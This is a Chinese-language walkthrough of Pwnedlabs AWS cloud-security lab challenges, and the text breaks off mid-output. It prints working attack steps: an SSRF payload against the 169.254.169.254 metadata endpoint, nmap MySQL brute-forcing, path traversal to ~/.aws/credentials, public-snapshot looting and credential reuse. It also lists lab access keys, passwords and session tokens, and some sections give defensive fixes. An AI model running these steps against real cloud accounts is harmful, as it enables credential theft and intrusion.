# Pwnedlabs

**首发于先知社区**

## 1.Identify the AWS Account ID from a Public S3 Bucket

80端口里面可以找到存储桶但是没有东西。

列举aws的account id参考https://cloudar.be/awsblog/finding-the-account-id-of-any-public-s3-bucket/

有一个 IAM 策略条件`s3:ResourceAccount`，旨在用于授予指定（一组）帐户中的 S3 访问权限，但也支持通配符。通过构建正确的模式，并查看哪些模式会导致拒绝或允许，我们可以通过一次发现一位数字来确定帐户 ID。

（不知道这个role是哪来的？？？）

```bash
s3-account-search arn:aws:iam::427648302155:role/LeakyBucket mega-big-tech
Starting search (this can take a while)
found: 1
found: 10
found: 107
found: 1075
found: 10751
found: 107513
found: 1075135
found: 10751350
found: 107513503
found: 1075135037
found: 10751350379
found: 107513503799
```



**知道了account id，就可以使用此信息来查找帐户所有者可能意外暴露的公共资源，例如公共 EBS 和 RDS 快照**

(最好知道创建 S3 存储桶的 AWS 区域，因为公共快照可供创建 EBS 或 RDS 快照的同一区域中的所有用户使用。如果创建了 S3 存储桶，则很可能会出现这种情况在特定区域，其他资源也将在那里可用！)

使用`curl -I https://mega-big-tech.s3.amazonaws.com`，可以获取S3所属的区域：

```bash
curl -I https://mega-big-tech.s3.amazonaws.com

HTTP/1.1 200 OK
x-amz-id-2: m924rb7FLutXpJm5c4Hk6uj/03uoKGMUeWf4yF15tuwOYDTa3+Qi+6QUIAK+Q1VL/IuzHqBTlHQ=
x-amz-request-id: FQAV7G01D5PHMFSK
Date: Fri, 20 Oct 2023 05:40:21 GMT
x-amz-bucket-region: us-east-1
x-amz-access-point-alias: false
Content-Type: application/xml
Server: AmazonS3
```

之后的操作：

![image-20231020153203472](pwnedlabs.assets/image-20231020153203472.png)

## 2.Intro to AWS IAM Enumeration

环境用不了，学习一些命令：



```bash

aws sts get-caller-identity

aws iam get-user
#枚举可能属于的所有组
aws iam list-groups-for-user --user-name dev01


#列出附加的用户策略
aws iam list-attached-user-policies --user-name dev01
#列出策略AmazonGuardDutyReadOnlyAccess的版本，--policy-arn从list-attached-user-policies中获得。Amazon 和客户管理的策略可以有多个版本，允许您保留、查看和回滚到以前的策略版本。内联策略不支持版本控制。
aws iam list-policy-versions --policy-arn arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess

#获得对应版本的policy
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess --version-id v3


#列出内联策略，AWS IAM 中的内联策略是直接嵌入到单个 IAM 用户、组或角色中的策略，并且不能单独管理或重复使用。
aws iam list-user-policies --user-name dev01
#获得内联策略
aws iam get-user-policy --user-name dev01 --policy-name S3_Access

#获取有关role的信息
aws iam get-role --role-name BackendDev
#获取附加的角色policy
aws iam list-attached-role-policies --role-name BackendDev
```

## 3.AWS S3 Enumeration Basics

网站的静态文件放在了一个存储桶中，匿名可读一些目录，从share目录下下载下来hl_migration_project.zip 

```bash
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip ./challenge3/hl_migration_project.zip --no-sign-request
```

解压后从里面读到了一个AKSK，configure后再次列admin目录，成功，但是不可读：

```bash
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt ./challenge3/flag.txt
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden

```



```bash
aws s3api get-bucket-acl --bucket dev.huge-logistics.com
{
    "Owner": {
        "DisplayName": "content-images",
        "ID": "b715b8f6aac17232f38b04d8db4c14212de3228bbcaccd0a8e30bde9386755e0"
    },
    "Grants": [
        {
            "Grantee": {
                "DisplayName": "content-images",
                "ID": "b715b8f6aac17232f38b04d8db4c14212de3228bbcaccd0a8e30bde9386755e0",
                "Type": "CanonicalUser"
            },
            "Permission": "FULL_CONTROL"
        }
    ]
}
```

但是migration-files可访问且可读key了。

下载下来：

```bash
aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml ./challenge3/test-export.xml


```

里面存储了很多的用户名密码，也有aws it admin的用户名密码：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<CredentialsExport>
    <!-- Oracle Database Credentials -->
    <CredentialEntry>
        <ServiceType>Oracle Database</ServiceType>
        <Hostname>oracle-db-server02.prod.hl-internal.com</Hostname>
        <Username>admin</Username>
        <Password>Password123!</Password>
        <Notes>Primary Oracle database for the financial application. Ensure strong password policy.</Notes>
    </CredentialEntry>
    <!-- HP Server Credentials -->
    <CredentialEntry>
        <ServiceType>HP Server Cluster</ServiceType>
        <Hostname>hp-cluster1.prod.hl-internal.com</Hostname>
        <Username>root</Username>
        <Password>RootPassword456!</Password>
        <Notes>HP server cluster for batch jobs. Periodically rotate this password.</Notes>
    </CredentialEntry>
    <!-- AWS Production Credentials -->
    <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
        <AccountID>794929857501</AccountID>
        <AccessKeyID>AKIA3SFMDAPOQRFWFGCD</AccessKeyID>
        <SecretAccessKey>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</SecretAccessKey>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
    </CredentialEntry>
    <!-- Iron Mountain Backup Portal -->
    <CredentialEntry>
        <ServiceType>Iron Mountain Backup</ServiceType>
        <URL>https://backupportal.ironmountain.com</URL>
        <Username>hladmin</Username>
        <Password>HLPassword789!</Password>
        <Notes>Account used to schedule tape collections and deliveries. Schedule regular password rotations.</Notes>
    </CredentialEntry>
    <!-- Office 365 Admin Account -->
    <CredentialEntry>
        <ServiceType>Office 365</ServiceType>
        <URL>https://admin.microsoft.com</URL>
        <Username>admin@company.onmicrosoft.com</Username>
        <Password>O365Password321!</Password>
        <Notes>Office 365 global admin account. Use for essential administrative tasks only and enable MFA.</Notes>
    </CredentialEntry>
    <!-- Jira Admin Account -->
    <CredentialEntry>
        <ServiceType>Jira</ServiceType>
        <URL>https://hugelogistics.atlassian.net</URL>
        <Username>jira_admin</Username>
        <Password>JiraPassword654!</Password>
        <Notes>Jira administrative account. Restrict access and consider using API tokens where possible.</Notes>
    </CredentialEntry>
</CredentialsExport>


```

配置好之后：

```bash
aws sts get-caller-identity
{
    "UserId": "AIDA3SFMDAPOWKM6ICH4K",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/it-admin"
}
```



再次下载，可以成功得到flag：

```bash
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt ./challenge3/flag.txt
```







## 4.Pillage Exposed RDS Instances

exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com





```bash
sudo nmap -Pn -p3306,5432,1433,1521 exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com
Password:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-21 11:32 CST
Nmap scan report for exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com (16.171.94.68)
Host is up (0.0051s latency).
rDNS record for 16.171.94.68: ec2-16-171-94-68.eu-north-1.compute.amazonaws.com

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
1521/tcp open  oracle
3306/tcp open  mysql
5432/tcp open  postgresql

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
```



发现3306端口开了mysql后，尝试爆破用户名密码：

```bash
nmap -Pn -p3306 --script=mysql-brute --script-args brute.delay=10,brute.mode=creds,brute.credfile=mysql-creds.txt exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-21 14:06 CST
Nmap scan report for exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com (16.171.94.68)
Host is up (0.0013s latency).
rDNS record for 16.171.94.68: ec2-16-171-94-68.eu-north-1.compute.amazonaws.com

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-brute:
|   Accounts:
|     dbuser:123 - Valid credentials
|_  Statistics: Performed 1 guesses in 12 seconds, average tps: 0.1

Nmap done: 1 IP address (1 host up) scanned in 11.86 seconds
```





```bash
mysql -udbuser -p123 -h exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com
```

进入后读flag即可：

```bash
use user_info
select * from flag;
+----------------------------------+
| flag                             |
+----------------------------------+
| e1c342d58b6933b3e0b5078174fd5a62 |
+----------------------------------+
1 row in set (0.14 sec)
```

users表也泄漏了大量信息。



**防御：**

```bash
#列出rds实例
aws rds describe-db-instances

#列出可公开访问的rds的identifier
aws rds describe-db-instances --query 'DBInstances[*].PubliclyAccessible' --query 'DBInstances[*].DBInstanceIdentifier'
```

之后在控制台搜索公开访问的rds的identifier即可找到受影响的数据库，通过下面的步骤让数据库不可公开访问：

1. 单击页面右上角的“修改”，将弹出“修改数据库实例”页面。
2. 向下滚动到“连接”下的“其他连接配置”子部分并展开。
3. 选择“不可公开访问”以使 RDS 数据库实例私有。

## 5.Path Traversal to AWS credentials to S3

download功能能路径穿越导致的任意文件读取

尝试读取nedf用户下面的`/.aws/credentials`，读到了一个aksk：

![image-20231021143454652](pwnedlabs.assets/image-20231021143454652.png)

```bash
aws sts get-caller-identity
{
    "UserId": "AIDATWVWNKAVDYBJBNBFC",
    "Account": "254859366442",
    "Arn": "arn:aws:iam::254859366442:user/nedf"
}
```



拿flag：`aws s3 cp s3://huge-logistics-bucket/flag.txt ./flag.txt`

这也说明了在云服务中，任意文件读取的攻击点也先看`/etc/passwd`看是否可能有云用户，以及它的`.aws`目录下面是否有aksk。

## 6.SSRF to Pwned

就是ssrf在云服务中的攻击。

网站中发现了存储桶，但是读不了flag：

```bash
aws s3 cp s3://huge-logistics-storage/backup/flag.txt ./flag2.txt --no-sign-request
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden

feng at fengs-MacBook-Pro.local in [~/github/CTF/AWS/pwnedlabs/challenge6]  on git:main ✗  987e539c "commit"
15:04:38 › aws s3 cp s3://huge-logistics-storage/backup/cc-export2.txt ./cc-export2.txt --no-sign-request
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```



`/status/status.php`是个ssrf，尝试读aksk：

```bash

http://hugelogistics.pwn/status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/

http://hugelogistics.pwn/status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access
```



然后配置，即可还要配置token：

```bash
aws configure set aws_session_token IQoJb3JpZ2luX2VjEND//////////wEaCXVzLWVhc3QtMSJHMEUCIAHo0zQ56WW725f3mdJW0KpdHL50Pyg53pkgD8czJm4AAiEA/2/CACvaBEf3w5+UWy1KZm5LwMvg6qOdW0LW/P/MNBcqxAUI6P//////////ARAAGgwxMDQ1MDY0NDU2MDgiDCHcX0uE5O74z4vIESqYBXgqUARzReNhKJr1jnR43PIQzBqYpw8M1FOS6Qx4BrukCprBO2jHDuu13L5aC5hJ508mYWGDWP+NPIw5ufp8+3jcqOGrw5rxqeI50v0z6Hc9CHLBtL9hoZDv8qHs0H7DNoQhUAe9Y6mvHzsKE7nHgFT+Q0JT58kazwjCC4dYbRHFXclUwg6uML6hffV1RvRrDacYVXBd9qQhKdD9fMXz7SVDMxbOtbparYrBamkp3I6iEJ5+fSFFSZK2/mNMs+P0tTOBseJ8GnM/MKLJ4Lo2PtpGB/v0okrrLe1dKehRoSVkoweXQuOrt7XctJaNzHfm+OHT3qI/AmdFuGrgq4IHTtN3MYaaYxKwFv/rKX3WhcJl2hB7gguJFDXvwCM2NodbPyfYip2fl0y8lUHqu6je3A7dFH/cYTJ2nVqMWs8ZXooD/RuXddJ86sfGur/DOE9SQfEsCxHpcjllkb6RozmgJNoMaRPw98h2/sOePsQ2q4MXN7j6ZhC3Q+I1PrdTuoWYkbY1c8ePjntrEOBQlncJLjRYsqNmYHZbzbmBzugCuhtIOO9r6tg1Mss5mJYOGfdKStOj3XPIfhxaviySIgIcUpoez0XxLclivTNsuk4saAB4QCtSaRIm+vYahe9yqgb6lO6q7lbka2AtVEdvXSNKBFVvcbS4EW/jI4YEmDz8CjZIv8YyysP4sg1s4ojUUDeMaLU43dY0Qk4tob6QIA8pFYqw99rpLPl82az68A34d2pdQjPUpH3RnpPi8gLHHLO9eRpaWhR0HlytY4JdeosJriMLA4a34RRaENsWuBpSX/Qj5q2nnBHj/ANVpEj90SdIllio7vf0m7gHKT4kdJ3XtTvhxk+67enu95oQJ8LgqF/jtVCIRYie0aYwkvPNqQY6sQG4Q0KNc9l2ZkBJit+On6jmPUYyRLAfxQQBVoTdxGN3jxCVOpaVnQMoZnMhl8VvNCMdkQlWa4deuPCt+ocWsROYwYNDhCW0JCi2/vmJjcBv/ZeV0Dva6gyd488rfKOg7Zcy3+qBLkzLc07b0Et0i/GS1/AUyl/zdXKkwSDoZhB4BeMfkZksMSzFuh3bS6OREg9SJehxL2Eoc+NEkhz/yDdazi0x3PTofktNLBIFpmD4oqM=
```





```bash
aws sts get-caller-identity
{
    "UserId": "AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1",
    "Account": "104506445608",
    "Arn": "arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1"
}

```

再下载flag就有权限了：

```bash
aws s3 cp s3://huge-logistics-storage/backup/flag.txt ./flag.txt
```



**防御：**

创建新的 EC2 实例（使用 AWS 控制台显示）时，高级设置下有用于配置元数据服务各个方面的选项。单击`Info`“下一步”`Metadata accessible`将显示默认情况下可以访问元数据。这并不奇怪，因为实例元数据对于实现实例管理非常有用。单击`Info`“下一步”将`Metadata version`显示下面的文本。

**除非另有指定**，否则在创建 EC2 实例时默认情况下实例元数据服务的版本 1 和 2 仍然可用。AWS 实例元数据服务 (IMDSv1) 的第一版不需要身份验证。任何可以向http://169.254.169.254/发出 HTTP 请求的进程都可以访问该数据。2019 年第一资本数据泄露事件就是利用了这种缺乏身份验证的情况。

如果需要实例元数据，建议使用版本 2，因为这需要身份验证。



## 7.Loot Public EBS Snapshots



```bash
aws sts get-caller-identity
{
    "UserId": "AIDARQVIRZ4UJNTLTYGWU",
    "Account": "104506445608",
    "Arn": "arn:aws:iam::104506445608:user/intern"
}

aws iam list-attached-user-policies --user-name intern
{
    "AttachedPolicies": [
        {
            "PolicyName": "PublicSnapper",
            "PolicyArn": "arn:aws:iam::104506445608:policy/PublicSnapper"
        }
    ]
}

aws iam get-policy --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper
{
    "Policy": {
        "PolicyName": "PublicSnapper",
        "PolicyId": "ANPARQVIRZ4UD6B2PNSLD",
        "Arn": "arn:aws:iam::104506445608:policy/PublicSnapper",
        "Path": "/",
        "DefaultVersionId": "v7",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-06-10T22:33:41+00:00",
        "UpdateDate": "2023-06-13T21:18:37+00:00",
        "Tags": []
    }
}

aws iam get-policy-version --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper --version-id v7
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": "ec2:DescribeSnapshotAttribute",
                    "Resource": "arn:aws:ec2:us-east-1::snapshot/snap-0c0679098c7a4e636"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "ec2:DescribeSnapshots",
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor2",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": [
                        "arn:aws:iam::104506445608:user/intern",
                        "arn:aws:iam::104506445608:policy/PublicSnapper"
                    ]
                }
            ]
        },
        "VersionId": "v7",
        "IsDefaultVersion": true,
        "CreateDate": "2023-06-13T21:18:37+00:00"
    }
}
```

当前intern用户可以执行的操作是`DescribeSnapshotAttribute`和`DescribeSnapshots`



直接查看快照会显示特别多，查看一下属于当前用户的快照：

```bash
aws ec2 describe-snapshots --owner-ids 104506445608 --no-cli-pager
{
    "Snapshots": [
        {
            "Description": "Created by CreateImage(i-06d9095368adfe177) for ami-07c95fb3e41cb227c",
            "Encrypted": false,
            "OwnerId": "104506445608",
            "Progress": "100%",
            "SnapshotId": "snap-0c0679098c7a4e636",
            "StartTime": "2023-06-12T15:20:20.580000+00:00",
            "State": "completed",
            "VolumeId": "vol-0ac1d3295a12e424b",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "PublicSnapper"
                }
            ],
            "StorageTier": "standard"
        },
        {
            "Description": "Created by CreateImage(i-0199bf97fb9d996f1) for ami-0e411723434b23d13",
            "Encrypted": false,
            "OwnerId": "104506445608",
            "Progress": "100%",
            "SnapshotId": "snap-035930ba8382ddb15",
            "StartTime": "2023-08-24T19:30:49.742000+00:00",
            "State": "completed",
            "VolumeId": "vol-09149587639d7b804",
            "VolumeSize": 24,
            "StorageTier": "standard"
        }
    ]
}
```

第二个快照没法查看属性会报奇怪的错，但是可以看第一个快照的：

```bash
aws ec2 describe-snapshot-attribute --snapshot-id snap-0c0679098c7a4e636 --attribute createVolumePermission --no-cli-pager
{
    "CreateVolumePermissions": [
        {
            "Group": "all"
        }
    ],
    "SnapshotId": "snap-0c0679098c7a4e636"
}
```

说明这个快照是公有的，所有人都可以根据这个快照创建卷。

接下来的思路就是根据这个公有快照创建卷，可用区选择和自己的 EC2 一样的，快照 ID 指定刚才随便找的快照。之后挂载卷attach volume，挂载成功后（没aws账号无法复现）：

```bash
sudo fdisk -l
sudo mkdir /test
sudo mount /dev/xvdf3 /test
sudo ls /test
```





随后在home的下面可以找到s3_download_file.php：

![image-20231021184110020](pwnedlabs.assets/image-20231021184110020.png)



```bash
AKIARQVIRZ4UDSDT72VT

weAlWiW405rY1BGIjLvIf+pDUvxxo6DByf8K3+CN

ecorp-client-data
```



可以直接读flag，还泄漏了一些信息：

```bash
aws s3 ls s3://ecorp-client-data
2023-06-13 04:32:59       3473 ecorp_dr_logistics.csv
2023-06-13 04:33:00         32 flag.txt
2023-06-12 23:04:25          7 test.csv
```





**防御：**

问题就在于那个公有快照，应该将其修改为私有。

下面的命令可以快速检测公开快照：

```bash
aws ec2 describe-snapshots --owner-id self --restorable-by-user-ids all --no-paginate
```



如果您发现您的 AWS 账户中的未加密快照已被公开暴露，您可以：

- 设为私有
- 轮换(Rotate，不好翻译)其上的所有凭据
- 调查它是如何被公开曝光的



## 8.Plunder Public RDS Snapshots

TODO，需要aws账号去复现。



## 9.Assume Privileged Role with External ID

网站存在一个config.json：

```json
{"aws": {
        "accessKeyID": "AKIAWHEOTHRFYM6CAHHG",
        "secretAccessKey": "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",
        "region": "us-east-1",
        "bucket": "hl-data-download",
        "endpoint": "https://s3.amazonaws.com"
    },
    "serverSettings": {
        "port": 443,
        "timeout": 18000000
    },
    "oauthSettings": {
        "authorizationURL": "https://auth.hugelogistics.com/ms_oauth/oauth2/endpoints/oauthservice/authorize",
        "tokenURL": "https://auth.hugelogistics.com/ms_oauth/oauth2/endpoints/oauthservice/tokens",
        "clientID": "1012aBcD3456EfGh",
        "clientSecret": "aZ2x9bY4cV6wL8kP0sT7zQ5oR3uH6j",
        "callbackURL": "https://portal.huge-logistics/callback",
        "userProfileURL": "https://portal.huge-logistics.com/ms_oauth/resources/userprofile/me"
    }
}

```



配置上去：

```bash
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDAWHEOTHRF7MLFMRGYH",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/data-bot"
}
```



列举一下当前的权限：

```bash
python3.10 enumerate-iam.py --access-key AKIAWHEOTHRFYM6CAHHG --secret-key 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


2023-10-21 20:12:47,354 - 11365 - [INFO] -- secretsmanager.list_secrets() worked!
```



看一下list_secrets:

```bash
aws secretsmanager list-secrets --no-cli-pager
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z",
            "Name": "employee-database-admin",
            "Description": "Admin access to MySQL employee database",
            "LastChangedDate": "2023-07-13T02:15:38.909000+08:00",
            "LastAccessedDate": "2023-10-16T08:00:00+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "41a82b5b-fb44-4ab3-8811-7ea171e9d3c1": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-07-13T02:14:35.740000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-rpkQvl",
            "Name": "employee-database",
            "Description": "Access to MySQL employee database",
            "RotationEnabled": true,
            "RotationLambdaARN": "arn:aws:lambda:us-east-1:427648302155:function:SecretsManagermysql-rotation",
            "RotationRules": {
                "AutomaticallyAfterDays": 7,
                "ScheduleExpression": "cron(0 0 ? * 2 *)"
            },
            "LastRotatedDate": "2023-10-16T15:18:02.417000+08:00",
            "LastChangedDate": "2023-10-16T15:18:02.369000+08:00",
            "LastAccessedDate": "2023-10-16T08:00:00+08:00",
            "NextRotationDate": "2023-10-24T07:59:59+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "2bb80579-4b3e-4319-8d74-3bca18a404a5": [
                    "AWSPREVIOUS"
                ],
                "388b154d-87b8-4c69-901b-9902484d22da": [
                    "AWSCURRENT",
                    "AWSPENDING"
                ]
            },
            "CreatedDate": "2023-07-13T02:15:02.970000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
            "Name": "ext/cost-optimization",
            "Description": "Allow external partner to access cost optimization user and Huge Logistics resources",
            "LastChangedDate": "2023-08-07T04:10:16.392000+08:00",
            "LastAccessedDate": "2023-10-19T08:00:00+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "f7d6ae91-5afd-4a53-93b9-92ee74d8469c": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-08-05T05:19:28.466000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK",
            "Name": "billing/hl-default-payment",
            "Description": "Access to the default payment card for Huge Logistics",
            "LastChangedDate": "2023-08-05T06:33:39.872000+08:00",
            "LastAccessedDate": "2023-10-19T08:00:00+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "f8e592ca-4d8a-4a85-b7fa-7059539192c5": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-08-05T06:33:39.828000+08:00"
        }
    ]
}

```

尝试`get-secret-value`，只有`arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4`可以得到secret：

```bash
aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4 --no-cli-pager
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
    "Name": "ext/cost-optimization",
    "VersionId": "f7d6ae91-5afd-4a53-93b9-92ee74d8469c",
    "SecretString": "{\"Username\":\"ext-cost-user\",\"Password\":\"K33pOurCostsOptimized!!!!\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-08-05T05:19:28.512000+08:00"
}
```

得到ext-cost-user:K33pOurCostsOptimized!!!!。

利用用户名密码登录aws控制台，id要输一开始拿到的aksk账号的id。



进入之后在aws cloudshell里拿到可用的aksk：

```bash
[cloudshell-user@ip-10-2-48-155 ~]$ aws configure export-credentials
{
  "Version": 1,
  "AccessKeyId": "ASIAWHEOTHRFSGSZQD7U",
  "SecretAccessKey": "g1r4/6M/8uPaaSFxwLtQQmGHNWTWacAyqexICQTN",
  "SessionToken": "IQoJb3JpZ2luX2VjENX//////////wEaCXVzLWVhc3QtMSJIMEYCIQDxZd2EjyqrmNoWubEysJcHtEeCLy+HG3JvFiNnccZNmAIhAKxnmydJNSat8bNrxGKkxWCVNlyza3TbctKCZKOOMCTyKpEDCO7//////////wEQABoMNDI3NjQ4MzAyMTU1IgzKYnvtS4qgMpoJDl0q5QJRUOYIe7cFXdl1hhAxI4Nl02fEERg0Bl/Qh5ANZuTUVNzfrwii6H0nEGwVFNBkkKj4FeWna0M7AUNEXSuEJb4nvHZYSlBMQhhuDGgRb+qCta9wS2ut/oGwE4mxCBVBFNlHgY8Zw/Tx6citymqkaTeAhmtqA67eaktvJc86HOJlAGnGVWXJYeysiTDCnFzWWagqw6bslvyvvE1qxibTHZ3g1jp1KhCHarbrY0Ehw3VfaGTQx7xTTnyNTs+srvMuvRuGCGP4zo8o33Q674K7EVQXXTUgX8nAx3G7Sk1VJ9+7EKPWZIvQqQDlohYSnNMJvLfwQZraGW2w17CggMqfmEq8PTiA8Ghw6zHUj5oHo6VXHLP7NT2fF3xnWyDoZNcWxsTTNDS8tn5udF9qK18MOdphyJy5O9DSK/UdlJCt0ZK7Dfq5gEIpVQQZYDPJEv0Yuv3xOyCYilxmXvF1RQuR8d+zL9bCLd4wjYrPqQY6sgI7fXfK5+m5QhHWmsJGqOxoCt6PUso1zMi+RgfUQ7HGRDe4vSXmJUzhfon8PAGJHmo7+OelPz+1lwqE/HyJQ4lxZw2VaVS2vVlAjoL2fmWHq/2hScgrVqc98D9YrOKG0X+pehxBlDI7PEwkDjMlLG9b5T48w14JjCprlKJf4MHDa2Y9+uwbYAHUtYvYx5zS4fKhVLjetXmKQ9m8QsSCwcGNFoxQWXjyQRFLhget6I1UkLDAtv+qKM4uLPjw6Q84IE4s1HnffpfrKz4JkXW+aF5VU1DISUCWZ+lCAhRUzBW38BHkmlu7saBcfWPpOVOZlMgjOoQ9tfR2ji94feR6x2a1SjzUFHxHxP8SEJKycWZBopitj6GzKIHGlWm8amUU8raBH7Pswf9KSZKj4AgYe0a/S4A=",
  "Expiration": "2023-10-21T12:49:50+00:00"
}
```



接下来的一系列操作就是简单的权限枚举，但是需要了解其现实的意义。

```bash
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDAWHEOTHRFTNCWM7FHT",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/ext-cost-user"
}

aws iam list-attached-user-policies --user-name ext-cost-user
{
    "AttachedPolicies": [
        {
            "PolicyName": "ExtCloudShell",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtCloudShell"
        },
        {
            "PolicyName": "ExtPolicyTest",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtPolicyTest"
        }
    ]
}

aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --no-cli-pager
{
    "Policy": {
        "PolicyName": "ExtPolicyTest",
        "PolicyId": "ANPAWHEOTHRF7772VGA5J",
        "Arn": "arn:aws:iam::427648302155:policy/ExtPolicyTest",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-08-04T21:47:26+00:00",
        "UpdateDate": "2023-08-06T20:23:42+00:00",
        "Tags": []
    }
}


#这显示了当前用户的一些权限
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4 --no-cli-pager
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetRole",
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedRolePolicies",
                        "iam:ListAttachedUserPolicies",
                        "iam:GetRolePolicy"
                    ],
                    "Resource": [
                        "arn:aws:iam::427648302155:policy/ExtPolicyTest",
                        "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
                        "arn:aws:iam::427648302155:policy/Payment",
                        "arn:aws:iam::427648302155:user/ext-cost-user"
                    ]
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-08-06T20:23:42+00:00"
    }
}

#这说明了当前用户可以assume-role得到ExternalCostOpimizeAccess的临时权限
aws iam get-role --role-name ExternalCostOpimizeAccess --no-cli-pager
{
    "Role": {
        "Path": "/",
        "RoleName": "ExternalCostOpimizeAccess",
        "RoleId": "AROAWHEOTHRFZP3NQR7WN",
        "Arn": "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
        "CreateDate": "2023-08-04T21:09:30+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::427648302155:user/ext-cost-user"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "StringEquals": {
                            "sts:ExternalId": "37911"
                        }
                    }
                }
            ]
        },
        "Description": "Allow trusted AWS cost optimization partner to access Huge Logistics resources",
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {
            "LastUsedDate": "2023-10-19T17:13:04+00:00",
            "Region": "us-east-1"
        }
    }
}

aws iam list-attached-role-policies --role-name ExternalCostOpimizeAccess  --no-cli-pager
{
    "AttachedPolicies": [
        {
            "PolicyName": "Payment",
            "PolicyArn": "arn:aws:iam::427648302155:policy/Payment"
        }
    ]
}


aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Payment --no-cli-pager
{
    "Policy": {
        "PolicyName": "Payment",
        "PolicyId": "ANPAWHEOTHRFZCZIMJSVW",
        "Arn": "arn:aws:iam::427648302155:policy/Payment",
        "Path": "/",
        "DefaultVersionId": "v2",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-08-04T22:03:41+00:00",
        "UpdateDate": "2023-08-04T22:34:19+00:00",
        "Tags": []
    }
}


#看一下ExternalCostOpimizeAccess用户的policy，发现其可以GetSecretValue。现实的意义可能是ExternalCostOpimizeAccess用户可以访问公司账单中的payment信息
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Payment --version-id v2 --no-cli-pager
{
    "PolicyVersion": {
